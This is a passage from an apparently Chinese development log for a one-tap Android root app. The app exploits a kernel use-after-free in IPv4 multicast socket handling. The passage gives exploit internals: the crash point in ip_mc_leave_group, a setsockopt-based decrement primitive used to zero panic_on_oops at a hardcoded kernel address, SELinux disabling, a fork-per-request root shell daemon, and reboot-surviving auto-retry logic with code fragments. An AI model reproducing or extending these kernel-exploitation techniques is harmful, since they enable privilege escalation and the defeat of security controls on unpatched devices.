改成写 `dst + ".new"` 再 `rename()` 覆盖：运行中的 inode 不被触碰，
rename 是原子的，也不受 ETXTBSY 限制。

### 36.3 ★ 自我纠错：`out.txt` 停在 USR/GRP 不是失败标志

之前我根据"失败那轮 `out.txt` 停在 `USR/NS/GRP`"推断 panic 发生在
`kread_at2(selinux_enforcing)` 附近。**这个推断是错的。**

核查代码后确认：`USR/NS/GRP` 之后所有进度都走 `rps()`（写 rep.bin 缓冲），
走 stdout 的 `puts_` / `mark` 已经没有了。**成功的那一轮 stdout 也停在同一行。**

反证：`report/shellrun.log` 里那次 shell 版运行同样停在 `USR/NS/GRP`，
但结果是成功的（Permissive、/mnt/su 扫描 4064、id -u = 0）。

同一轮还排除了另外几条：
- **rep.bin 不可用**：exploit 只 `ftruncate` 到原大小、不真正清空，
  文件里混着 probe111 时代的老内容，末尾还留着上一轮成功的 `HB` 心跳。
- **不是 SIGPIPE**：app 用 `exec ./z5root > out.txt 2>&1` 起进程，stdout 是文件不是管道。
- **不是 g_rbuf 越界**：0x30000000 映射了 0x2000，`kread_at2` 最多写到 0x810。
- **不是开机那 458 条 `BUG: scheduling while atomic`**：调用栈已抓到，
  全部来自 `brcm_hci_ldisc` 的 `brcm_hci_snoop()` 在 `flush_to_ldisc()` 原子上下文里
  `msleep()` —— Sony 原厂蓝牙驱动 bug，与 exploit 无关，也不引发 panic。

### 36.4 为什么 panic 现场拿不到（死结）

1. `panic_on_oops=1` + `panic=5`：任何 oops 立刻停摆，5 秒后重启。
2. 没有 `/proc/last_kmsg`，没有 `/sys/fs/pstore`（这版没开 ramoops）。
3. Android 6 toybox 的 `dmesg` **不支持 `-w`**，只能整段轮询；
   而 panic 后 adbd 先死，轮询也来不及。
4. `klogw` 每 5ms 轮询 + fsync，但 panic 时调度器已停，没机会落盘。
5. **试过 `echo 0 > /proc/sys/kernel/panic_on_oops`**（root 在位时成功，读回 0），
   再清 `lastboot.txt`/`running.txt` 触发重跑 —— 结果**成功**，dmesg 0 条新增 oops。
   也就是说故障只在**冷启动后的第一次**尝试出现，而那一刻 `panic_on_oops` 必然是 1。

⇒ 这是个死结，需要外部思路（见交接文档 33.11 末尾给 GLM 的问题清单）。

### 37.1 崩溃点定位：`MCAST_LEAVE_GROUP`

用 hold 模式把 panic 之前的现场导出来（`report/forensics/rep_fail1.bin` 同批）：

```

L2 00001000
M 0c00000030000000
LG 00000a8c
```

**没有 `m`** —— `mark('m')` 是在 `setsockopt(ser, SOL_IP, MCAST_LEAVE_GROUP, ...)` 返回之后
才打的。所以崩溃发生在 `MCAST_LEAVE_GROUP` 内部，也就是 `ip_mc_leave_group()` 里：

```c

    if (imr->imr_multiaddr.s_addr == iml->multi.imr_multiaddr.s_addr) {
        *imlp = iml->next;                       // ← iml 此时是已被回收的 UAF 对象
        ...
        sock_kfree_s(sk, iml, sizeof(*iml));     // ← 二次 free / free 到别处 -> panic
```

这一步是 exploit 的"开锁"动作，**在拿到内核读写原语之前**，所以：
- 没法提前关 `panic_on_oops`（还没原语）；
- 失败了只能整机重启。

### 37.2 PDEC 原语：把 `panic_on_oops` 从 1 减到 0

`ip_mc_source(add=0)`（`IP_UNBLOCK_SOURCE`，内核源码 `net/ipv4/igmp.c:1966`）：

```c
if (!add) {
    for (i=0; i<psl->sl_count; i++) { rv = memcmp(&psl->sl_addr[i], &src, 4); if (!rv) break; }
    if (rv) goto done;                                  // 找不到 -> EADDRNOTAVAIL
    if (psl->sl_count == 1 && omode == MCAST_INCLUDE)    // ★ ip_sockglue.c:805
        { leavegroup = 1; goto done; }                   //   UNBLOCK 是 MCAST_EXCLUDE, 不走这条
    for (j=i+1; j<psl->sl_count; j++) psl->sl_addr[j-1] = psl->sl_addr[j];
    psl->sl_count--;                                     // ★★ 这就是"减 1"
}
```

关键点（都已核对源码）：
- `IP_UNBLOCK_SOURCE` → `omode = MCAST_EXCLUDE`，所以 `sl_count==1` 时**不会**走
  `leavegroup` 分支，而会真的 `sl_count--`。
- `sl_count == 1` 时 `for (j=i+1; ...)` 空转，**不会顺带写 `sl_addr[0]`** —— 原语是干净的。
- `src` 必须等于 `*(u32*)(target+0x10)`（即 `sl_addr[0]`），所以先 kread 一下再传。

于是：`panic_on_oops`（`0xffffffc0017e14f0`，`int`，冷启动恒为 1）
用同一条 `setsockopt(..., 37, ...)` 减成 0，**代价为零**。

> 顺便确认内核**没开 KASLR**：`/proc/kallsyms` 里 `selinux_enforcing` 就是
> `0xffffffc00187d47c`，和代码里的硬编码常量完全一致；`panic_on_oops` 也一样稳定。

代码位置：`kdec(target)`（probe_app.c / probe149s.c），以及流程里的 **步骤 0.5**：
必须在四次 cap 写之前（实测崩溃就在 `W2` 附近）。

### 37.3 两层重试

| 层 | 触发条件 | 机制 |
|---|---|---|
| ① 同 boot 原地重试 | exploit 失败但没 panic（典型是 LEAVE 返回 `-EADDRNOTAVAIL` 后安全挂住） | App 的 `work()` 最多起 3 次 exploit，每次轮询 48s |
| ② 跨 reboot 自动续跑 | 失败并 panic 重启（LEAVE 内部崩） | 点按钮时写 `pending.txt`；`BootReceiver` 收到 `BOOT_COMPLETED` 后自动拉起；最多 3 次；成功后立刻删 `pending.txt` |

**② 是这次的关键**：panic 发生在原语之前，同 boot 内没有第二次机会，只能靠下次开机。

`pending.txt` 语义 = "用户点过一次 root，这次授权还没兑现"。所以：
- 没点过 → 文件不存在 → 开机什么也不做（实测日志 `boot: pending 不存在, 不自动跑`）；
- 成功了 → 文件删除 → 之后开机一律不跑；
- 连试 3 次还没成 → 删文件，不再折腾。

### 37.4 这轮踩到的三个坑

1. **`Activity` 不能立刻 finish**。原来的设计是点了就 `finishAndRemoveTask()` 退到后台，
   结果 `work()` 的后台线程随进程被回收 —— 实测"3 次重试一次都没发生"。
   改成：跑的过程中保持 Activity 在前台，`work()` 结束后停 6 秒再 `finishAndRemoveTask()`。
2. **`adb install -r` 反复装会把包搞成 `stopped=true notLaunched=true`**，
   而 Android 从 3.1 起 **未启动过的应用收不到 BOOT_COMPLETED**。
   现象是 BootReceiver 一声不响。验收脚本改成"只在开始时装一次"，
   并确认 `dumpsys package` 里 `notLaunched=false`。
3. **用 root 手写 `pending.txt` 必须改属主 + `restorecon`**，否则 app 在 Enforcing 下读不到
   （表现为 `pending 无效, 清掉`）。正常流程里文件是 app 自己写的，不会遇到。

### 38.1 隐患：已 root 时按"重跑"会重建 UAF

旧的 `work()` 无条件跑 exploit。而 root 已经就位时再跑一遍，唯一的收益是 0，
风险却是实打实的 —— 重建 UAF 的 `MCAST_LEAVE_GROUP` 那一步有 ~40% 概率 panic。
用户误点一次就黑屏重启，完全不符合"稳定"的要求。

**修法**：`work()` 开头先 `rootReady()`（`/mnt/su` 有 s 位 **且** `su -c id` 真能
exec 出 `uid=0`），成立就直接收工：

```java
if (rootReady()) {
    writeFile(dir + "/lastboot.txt", bootId());
    delete(dir + "/pending.txt");
    delete(dir + "/running.txt");
    show("★ 已经是 root 状态。\n\n本次不再重建 UAF ...");
    leave();          // 留 6 秒后 finishAndRemoveTask
    return;
}
```

**为什么不会误判**：重启后 SELinux 回到 `Enforcing`，`/mnt/su` 虽然还在但在
untrusted_app 域下 exec 会被 avc 拒掉，`su -c id` 拿不到 `uid=0` ⇒ `rootReady()`
返回 false ⇒ 该跑的时候还是会跑。逻辑与"重启即失效"的语义天然对齐。

**实测（05:26，全新安装、无 lastboot.txt，所以走的是"真正的一键"分支）**：

```

05:26:34.293  ★ 已经是 root 状态。
              -rwsr-sr-x root root 4064 2026-11-11 05:24 su     ← 时间戳没变
              uid=0(root) ... context=u:r:untrusted_app:s0
```

**从点击到判定 126 毫秒**，`/mnt/su` 时间戳仍是上一轮的 `05:24`（没被重写），
说明 UAF 一个字节都没重建，手机也没重启。误点"重跑"从此不可能引发重启。

### 38.2 隐患：root 服务每次 su 留一个 zombie

`ps` 里看到：

```
root      2696  1  ... hrtimer_na  S ./z5root          ← 主进程, 长眠
root      3281  2696 ... __skb_recv  S ./z5root         ← 服务(accept/recv)
u0_a369   2719  2696 ... do_exit     Z z5root           ← 僵尸
u0_a369   2815  2696 ... do_exit     Z z5root
...                                      （共 11 个）
```

根因在 `serve_root()`：它是 **fork-per-request** 模型（每来一条 `su -c` 就
`fork()` 一个子进程去 `exec /system/bin/sh`），但**父进程从不回收**。
每小时 soak 跑 40 条 su ⇒ 每小时涨 40 个僵尸。

不致命（僵尸不吃 CPU、只占一点 task_struct/PID），但会一直涨，属于"不该有的
脏东西"。修法：服务启动时把 `SIGCHLD` 置 `SIG_IGN`，内核直接回收退出的子进程：

```c
struct { unsigned long h, fl, rs, mk; } sa;
sa.h = 1; sa.fl = 0; sa.rs = 0; sa.mk = 0;        // SIG_IGN
sysc(134, 17, (long)&sa, 0, 8, 0, 0);             // rt_sigaction(SIGCHLD)
```

（aarch64 的 `struct sigaction` 顺序是 handler / flags / restorer / mask，
即 asm-generic 布局；`rt_sigaction` = 134，`SIGCHLD` = 17。）

已同步进 `probe_app.c` 与 `probe149s.c`，产物 33232 / 32988 字节。
**当前这一轮 root 是旧二进制起的，11 个僵尸清不掉**（只有父进程能回收），
下次触发 root 时自然归零 —— 所以放在下一轮冷启动验收里一起验。

### 38.9 ★★★ 抓到并修掉了"自动续跑偶尔不触发"的真凶

`finalcheck.sh` 第一次跑（07:30）结果是：点了图标 → 之后一直 `Enforcing`、
`z5root 进程 = 0`、`/mnt/su not found`，**看起来完全没反应**。

现场证据：

```
prev/ 目录: 存在（07:31 创建）
prev/meta.txt: 0 字节          ← 写入被硬生生打断
prev/ 里其它文件: 一个都没有
包状态: stopped=true notLaunched=true   ← 重启后又回到"从未启动"
```

也就是说：**App 确实启动了，跑了 `dumpPrev()`，然后内核 panic 重启**。
但重启之后包被标成 `stopped=true`，Android 3.1+ 不给这种包投递
`BOOT_COMPLETED` ⇒ `BootReceiver` 不触发 ⇒ 自动续跑断链。

**为什么会退回 `stopped=true`？** 做了两组对照实验（装好 → 点图标 → N 秒后重启）：

| 点击后多久重启 | 重启后 stopped | 重启后 notLaunched |
|---|---|---|
| 5 秒 | **true** | **true** ← 断链 |
| 15 秒 | false | false ✅ |

结论：PackageManager 把"已启动"写进 `/data/system/packages.xml` **有约 10 秒延迟**，
只改内存。而我们的 exploit 最快几秒就能跑到 `MCAST_LEAVE_GROUP` 并 panic ——
赶在写盘之前重启，"这次授权流程"就丢了。

**修法**：`work()` 里动手前先等 15 秒（屏幕上倒计时，用户不会以为卡住）：

```java
for (int i = 0; i < 5; i++) {
    final int left = 15 - i * 3;
    show("正在准备…\n\n" + left + " 秒后开始。\n"
            + "(这一步不能省: 让系统先记住你启动过本应用,\n"
            + " 万一后面崩溃重启, 开机才能自动接着跑。)");
    Thread.sleep(3000);
}
```

这 15 秒是**兑付"点一次就成"的必要成本**：它保证哪怕第一次就 panic，
开机后也一定能自动接上。代价是单次总耗时从 ~25s 变成 ~40s，可接受。

### 38.10 僵尸数归零（改对位置了）

第 38.2 节把 `SIGCHLD=SIG_IGN` 加在了 `serve_root()`（守护进程）里，实测**没用** ——
`ps` 里还是 11 个 `<defunct>`，而且父进程是 **5849（主 exploit 进程）**，不是守护进程。

真正的原因在 `probe_app.c` 里：

```c
long kids[10];
for (int i = 0; i < 10; i++) {          // ← UAF 竞态用的 10 个"钉核"子进程
    long kp = fork_();
    if (kp == 0) { ... for (;;) sleepms(1000); }
}
```

这 10 个 + 后面 exec 自检的 1 个 = **固定 11 个**，退出后父进程从不 `wait()`。
跟 `su` 调用次数无关（之前怀疑"每条 su 漏一个"是错的）。

修法（两处，`probe_app.c` / `probe149s.c` 都改）：

1. 10 个 fork **之后**立刻 `rt_sigaction(SIGCHLD, SIG_IGN)` —— 覆盖后面所有 fork；
2. 起守护进程之前，用 `wait4(-1, NULL, WNOHANG, NULL)` 循环把**已经**变僵尸的收掉
   （`SIG_IGN` 只对"设完之后"退出的子进程生效）。

`wait4` = 260。实测结果：`z5root 僵尸 = 0`，而且存活进程从 15 个降到 **3 个**
（主进程 + 日志抄写员 + root 服务）—— 那 10 个钉核子进程本来就会自己退出，
